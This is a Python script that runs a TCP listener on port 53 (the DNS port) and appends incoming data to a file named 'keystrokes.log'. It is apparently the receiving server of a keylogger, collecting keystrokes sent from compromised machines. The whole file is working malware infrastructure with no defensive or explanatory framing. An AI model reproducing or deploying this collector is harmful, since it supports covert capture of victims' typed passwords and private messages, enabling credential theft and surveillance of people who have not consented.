import socket

FILENAME = 'keystrokes.log'

def main():
    #tcp connection
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    #binding the socket
    server.bind(('',53))

    #setting the server in listen mode
    server.listen()
    print('[+] Server is up!')

    try:
        while True:  
            conn, addr = server.accept()     
            print(f'Connection from {addr[0]} on port {addr[1]}')
        
            #decoding the data which is send by the client
            print(addr[0])
            data = conn.recv(4096).decode() 
            print(data)
            if not data:
                continue

            #Creating a file at server
            with open(FILENAME,'a+') as fh:
                while data:
                    if not data:
                        break
                    else:
                        fh.write(data)
                        fh.write('\n')
                        data = conn.recv(1024).decode()
        
            print('[+] Received Successfully!')
            conn.close() #closing the connection

    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    main()

